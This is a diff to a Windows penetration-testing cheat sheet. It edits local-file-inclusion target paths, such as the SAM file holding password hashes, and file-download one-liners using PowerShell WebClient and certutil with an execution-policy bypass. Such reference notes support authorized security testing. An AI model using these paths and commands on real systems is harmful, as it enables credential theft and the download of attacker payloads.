@@ -12,7 +12,7 @@
 - `netstat -ano`. view open connections
 
 ## lfi
-- `C:/license.rtf`. OS version
+- `C:/Windows/System32/en-US/Licenses/_Default/.../license.rtf`. OS version
 - `C:/WindowsUpdate.log`. current state of windows updates
 - `C:/SoftwareDistribution`. previously downloaded windows update patches
 - `C:/Windows/system32/config/regback/sam`. stored password hashes
@@ -28,9 +28,8 @@ powershell.exe -exec bypass -C "<COMMAND>"
 
 ### download file
 
-```powershell
-(New-Object System.Net.WebClient).DownloadFile(<URL>, <OUTPUT>)
-```
+- (powershell) `(New-Object System.Net.WebClient).DownloadFile(<URL>, <OUTPUT>)`.
+- (cmd) `certutil.exe -urlcache -f <URL>`
 
 ### references
 - [ss64.com: `runas`](https://ss64.com/nt/runas.html)
